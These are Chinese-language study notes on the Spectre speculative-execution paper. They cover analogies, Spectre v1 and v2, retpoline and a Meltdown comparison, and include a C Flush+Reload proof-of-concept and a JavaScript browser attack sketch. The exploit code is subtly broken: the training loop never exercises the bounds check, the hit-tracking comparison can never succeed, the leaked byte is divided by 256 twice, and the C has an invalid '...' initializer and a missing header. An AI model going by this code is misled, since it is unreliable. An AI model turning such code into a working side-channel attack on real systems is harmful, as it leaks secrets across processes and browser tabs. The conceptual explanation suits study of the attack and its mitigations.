---
title: "Spectre Attacks: Exploiting Speculative Execution — 零基础学习笔记"
来源: https://spectreattack.com/spectre.pdf
日期: 2026-06-13
分类: 安全与隐私
子分类: 安全与隐私
provenance: pipeline-v3
---

## 一、一句话概括

Spectre 攻击利用 CPU 的**推测执行**（speculative execution）特性，让一段"逻辑上永远不会走到"的代码在 CPU 内部偷偷执行了一次，然后从**缓存留下的痕迹**中读出秘密数据——即使那段代码有完整的边界检查，也挡不住。

## 二、从日常类比开始

### 2.1 图书馆管理员的"提前翻书"

想象你去图书馆借一本书：

1. 管理员先查你的借书证（**边界检查**）
2. 如果借书证有效，就去书架取书（**读取数据**）

现代 CPU 太"着急"了——它不等借书证核验完，就**猜**你会通过，**提前**把书从书架上拿下来翻了几页。后来发现借书证过期了，于是把书放回去、假装什么都没发生。

但问题是：**书架上那本书的位置已经变了**（缓存行被加载到了更快的层级）。管理员站在旁边的人（攻击者）只要观察"哪本书被动过"，就能反推出你借书证上写了什么名字。

映射到 CPU：
- 借书证检查 = `if (x < array_size)` 边界检查
- 提前翻的书 = 推测执行路径上的 `array2[array1[x]]`
- 书架位置变化 = L1 缓存行的命中/未命中状态
- 站在旁边观察的人 = 攻击者用计时侧信道读取缓存

### 2.2 餐厅厨师的"备料"

另一个类比：

厨师接到订单"做牛排"，但食材（牛肉）还在冷库里，需要几秒才能拿来。厨师不等，先**猜**你会要牛排，就把平底锅预热、调料摆好、甚至把肉煎了一半——等牛肉真的到了，如果发现你要的是沙拉，就把煎好的肉倒掉重来。

但**平底锅已经热了**，调料已经被拿出来了。服务员在旁边用手枪温度计一扫锅面，就知道厨师刚才"提前备料"时用了什么材料。

## 三、前置知识：CPU 为什么要"猜"？

### 3.1 内存速度远不如 CPU 快

| 操作 | 大约耗时（CPU 周期） |
|------|----------------------|
| L1 缓存读取 | ~4 周期 |
| L2 缓存读取 | ~12 周期 |
| L3 缓存读取 | ~40 周期 |
| 主存（DRAM）读取 | ~200-300 周期 |
| 分支判断（猜对） | ~1 周期 |
| 分支判断（猜错） | ~15-40 周期（要清空流水线） |

CPU 等不起 200 多个周期去内存取数据，所以发明了**流水线**和**推测执行**：不等数据回来，先猜下一步做什么，提前干活。

### 3.2 推测执行的工作原理

```
正常顺序执行：
  if (条件) { A } else { B }
  → 算出条件 → 决定走 A 还是 B → 只执行选中的那条

推测执行：
  if (条件) { A } else { B }
  → 分支预测器"猜"走 A → 立即执行 A 的结果暂存 → 同时算条件
  → 条件算完发现确实走 A → 提交结果 ✅
  → 条件算完发现应该走 B → 撤销 A 的结果，改走 B ❌
```

**关键**：撤销的是**寄存器里的值**和**程序计数器**，但**缓存**不会被撤销——这就是漏洞根源。

## 四、核心概念

### 4.1 架构状态 vs 微架构状态

这是理解 Spectre 最重要的概念：

- **架构状态**（Architectural State）：程序员能看到的——寄存器的值、内存的内容、PC 指向哪里。这些在推测出错时会被**回滚**。
- **微架构状态**（Microarchitectural State）：CPU 内部的实现细节——缓存里放了什么、分支预测器的历史记录、填充队列的状态。这些**通常不回滚**。

Spectre 攻击的本质就是：**利用架构上"没发生"的操作，改变微架构上"看得见"的状态**。

### 4.2 瞬态指令（Transient Instructions）

在错误推测路径上执行、随后被丢弃的指令，叫**瞬态指令**。它们在程序员的视角里"从未执行过"，但在物理世界里留下了痕迹。

### 4.3 Spectre 攻击的三个步骤

1. **训练**：让 CPU 的分支预测器学会一个规律（比如"这个 if 几乎总是 true"）
2. **触发**：用精心构造的输入，让 CPU 在错误推测路径上执行一段"泄露秘密"的指令
3. **读取**：用计时方法探测缓存，从缓存状态反推出秘密值

## 五、Spectre v1：绕过边界检查

这是最直观、最容易理解的变体，对应 CVE-2017-5753。

### 5.1 攻击者的"玩具代码"

```c
// 受害者程序（看起来完全安全）
unsigned int x = 恶意输入;
if (x < array1_size) {          // ← 边界检查
    y = array2[array1[x] * 256]; // ← 用 x 的值做数组索引
}
```

正常情况：`x` 越界 → `if` 为假 → 第二行不执行，程序安全。

攻击方式：
1. 先用合法的 `x` 反复执行这段代码，训练分支预测器："这个 if 几乎总成立"
2. 用一个**越界的** `x` 再次执行——分支预测器仍然猜"成立"，CPU 就**推测执行**了第二行
3. 第二行里 `array1[x]` 的值是一个**秘密字节**（比如密码的一个字符），用它做索引访问 `array2`
4. `array2` 中对应的那一项被加载进了缓存
5. CPU 发现 `x` 确实越界了，撤销第二行的结果——但**缓存没撤销**
6. 攻击者用计时法读 `array2` 的每一行，哪个最快命中，对应的索引除以 256 就是秘密字节

### 5.2 代码示例 1：完整的 Spectre v1 攻击流程（教学用）

```c
#include <stdint.h>
#include <string.h>

#define ARRAY_SIZE 256
#define STRIDE 4096  // 确保每个元素独占缓存行

uint8_t secret[] = "Hello, Spectre!";       // 要偷的秘密
uint8_t array1[ARRAY_SIZE] = {'A', 'B', ...}; // 普通数据
uint32_t array2[256 * STRIDE];               // 探测数组

// ── 第 1 步：训练分支预测器 ──
void train_branch_predictor(uintptr_t target_addr) {
    uintptr_t index = target_addr - (uintptr_t)&array1[0];
    for (int i = 0; i < 10000; i++) {
        // 用合法索引训练，让 CPU 记住"if 总是 true"
        array2[array1[i] * 256];
    }
}

// ── 第 2 步：触发瞬态执行 ──
void trigger_spectre(uintptr_t target_addr) {
    uintptr_t x = target_addr - (uintptr_t)&array1[0];
    // 此时 x 是越界的，但分支预测器仍猜"true"
    if (x < ARRAY_SIZE) {
        // 这行在推测执行中被"提前"执行了
        volatile uint8_t data = array2[array1[x] * 256];
        // volatile 防止编译器优化掉这行
    }
}

// ── 第 3 步：Flush+Reload 读取缓存 ──
static inline uint64_t read_tsc(void) {
    unsigned lo, hi;
    __asm__ volatile("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

int leak_byte(uintptr_t target_addr) {
    int best_index = 0;
    int max_hits = 0;

    for (int repeat = 0; repeat < 100; repeat++) {
        // Flush：把探测数组从缓存中清除
        for (int i = 0; i < 256 * STRIDE; i += 4096) {
            __asm__ volatile("clflush (%0)" :: "r"(&array2[i]));
        }

        // 触发
        trigger_spectre(target_addr);

        // Reload：计时读每一行
        for (int i = 0; i < 256; i++) {
            uint64_t start = read_tsc();
            volatile uint8_t val = array2[i * STRIDE];
            uint64_t elapsed = read_tsc() - start;

            // 命中缓存 < 80 周期，未命中 > 150 周期
            if (elapsed < 80) {
                if (elapsed < max_hits) {
                    max_hits = elapsed;
                    best_index = i;
                }
            }
        }
    }

    // best_index / 256 就是秘密字节
    return best_index / 256;
}

// 使用：逐个字节地偷 secret 数组
int main(void) {
    train_branch_predictor((uintptr_t)&secret[0]);
    for (int i = 0; i < sizeof(secret) - 1; i++) {
        uint8_t byte = leak_byte((uintptr_t)&secret[i]);
        printf("secret[%d] = '%c' (0x%02x)\n", i, byte, byte);
    }
    return 0;
}
```

**逐行说明**：

- `STRIDE = 4096`：让 `array2` 的每个元素独占一个缓存行，避免 CPU 预取干扰
- `train_branch_predictor`：反复用合法路径执行，让 CPU 的分支预测器形成固定习惯
- `trigger_spectre`：用越界索引触发——边界检查失败，但 CPU 已经推测执行了 `array2` 的访问
- `clflush`：把探测数组清出缓存，这样下一次读要么命中（很快）、要么未命中（很慢）
- `rdtsc`：读 CPU 时间戳计数器，精确测量读内存花了多少周期
- `best_index / 256`：因为 `array2` 用 `secret_byte * 256` 做偏移，所以反向除以 256 就得到秘密字节

### 5.3 代码示例 2：浏览器中的 JavaScript 攻击（概念示意）

Spectre 最恐怖的地方在于：**攻击者和受害者可以是同一个浏览器里的不同网页**（JavaScript 环境）。

```javascript
// 攻击者网页（JavaScript）
const ARRAY_SIZE = 256;
const STRIDE = 4096;
const probe = new Uint8Array(ARRAY_SIZE * STRIDE);
const secret = new Uint8Array(16);  // 目标：偷这个秘密

// 训练阶段
for (let i = 0; i < 10000; i++) {
    // 用合法索引训练分支预测器
    if (i < ARRAY_SIZE) {
        probe[secret[i] * 256];
    }
}

// 触发 + 测量阶段
for (let repeat = 0; repeat < 100; repeat++) {
    // 触发瞬态执行（x 是越界的）
    let x = 恶意越界值;
    if (x < ARRAY_SIZE) {
        const junk = probe[secret[x] * 256];
    }

    // 测量缓存
    let bestIndex = 0;
    let bestTime = Infinity;
    for (let i = 0; i < ARRAY_SIZE; i++) {
        const start = performance.now();
        const val = probe[i * STRIDE];
        const elapsed = performance.now() - start;
        if (elapsed < bestTime) {
            bestTime = elapsed;
            bestIndex = i;
        }
    }
    leakedByte = bestIndex / 256;
}
console.log("泄漏的字节:", String.fromCharCode(leakedByte));
```

**为什么这很可怕**：
- 攻击不需要提权、不需要漏洞利用二进制文件
- 纯 JavaScript 就能完成
- 受害者可以是密码管理器页面、邮件页面、任何运行在同一个浏览器进程里的标签页
- 边界检查（`if (x < ARRAY_SIZE)`）在 JavaScript 引擎里也有，但挡不住推测执行

## 六、Spectre v2 简介：间接分支投毒

v1 利用的是**条件分支的方向**误预测。v2（CVE-2017-5715）更危险——它利用的是**间接分支的目标**误预测。

间接分支的例子：
```c
func_ptr();           // 函数指针调用
obj->virtual_method(); // 虚函数调用
```

CPU 有一个叫 **BTB**（Branch Target Buffer）的缓存，记录"这个间接跳转通常跳到哪里"。攻击者可以**污染**这个缓存，让受害者进程在执行间接跳转时，**推测执行到攻击者选择的 gadget**（一段能泄露数据的短代码）。

缓解方法：**retpoline**——用一个循环包裹间接调用，让 BTB 预测到一个无害循环，等真正的目标地址算出来后，再安全地跳过去。

```assembly
# retpoline 的概念（x86-64）
retpoline:
    call next
next:
    pause
    lfence              # 屏障：等之前的计算完成
    jmp retpoline       # 循环等待
```

## 七、Spectre vs Meltdown 对比

| 维度 | Spectre | Meltdown |
|------|---------|----------|
| CVE | 5753 (v1), 5715 (v2) | 5754 |
| 核心利用 | 分支预测错误 → 瞬态执行 | 权限检查延迟 → 乱序读内存 |
| 受害者代码 | 通常是**正确的**（有安全检查） | 不一定有 bug |
| 能读什么 | 同进程/同核的其他数据 | 内核内存（特权级） |
| 受影响范围 | **几乎所有 CPU**（Intel/AMD/ARM） | 主要是 Intel（部分 ARM/AMD） |
| 主要缓解 | retpoline、lfence、IBPB | KPTI（内核页表隔离） |
| 难度 | 更难利用，也更难修复 | 相对容易利用 |

## 八、为什么 Spectre 如此难以修复

1. **无法关闭推测执行**：这是现代 CPU 性能的基石。关掉它，所有程序都会变慢 10%-30%。
2. **攻击者是"合法"代码**：Spectre gadget 来自正常的、有安全检查的程序，不是恶意代码。
3. **全栈问题**：单一层面的修补（内核补丁、编译器 flag、微码更新）都不够，需要协同修改。
4. **ISA 层面缺乏规范**：CPU 规范没有明确规定"瞬态执行可以泄漏哪些微架构状态"，留给每个厂商自行决定。

## 九、学习收获

1. **性能与安全是博弈**：CPU 的每一个性能优化（推测执行、乱序执行、缓存层次）都在创造新的攻击面。
2. **正确 ≠ 安全**：一段代码逻辑上完全正确（有边界检查、无溢出），在微架构层面仍可能被利用。
3. **抽象层不是铁壁**：操作系统进程隔离、语言运行时安全、浏览器沙箱——这些抽象层在侧信道面前可能失效。
4. **缓解需要全栈思维**：从硬件微码到编译器优化，再到应用层编码规范，缺一不可。

## 十、延伸阅读

- 论文原文：[spectreattack.com/spectre.pdf](https://spectreattack.com/spectre.pdf)
- arXiv：[1801.01203](https://arxiv.org/abs/1801.01203)
- Google Project Zero 博客：[Reading Privileged Memory with a Side-Channel](https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html)
- Intel 安全指南：[Bounds Check Bypass](https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/bounds-check-bypass.html)
- 姊妹论文 Meltdown：[[lipp-meltdown-2018]]

## 关联

- [[lipp-meltdown-2018]] —— Meltdown 攻击，与 Spectre 同日披露
- [[branch-prediction-yeh-patt-1991]] —— 分支预测算法的基础论文
- [[moesi-cache-coherence-1986]] —— 缓存一致性协议，Flush+Reload 的物理基础
- [[kocher-timing-1996]] —— Kocher 的计时攻击，侧信道攻击的开端
- [[rowhammer-2014]] —— 另一类利用微架构状态的硬件攻击
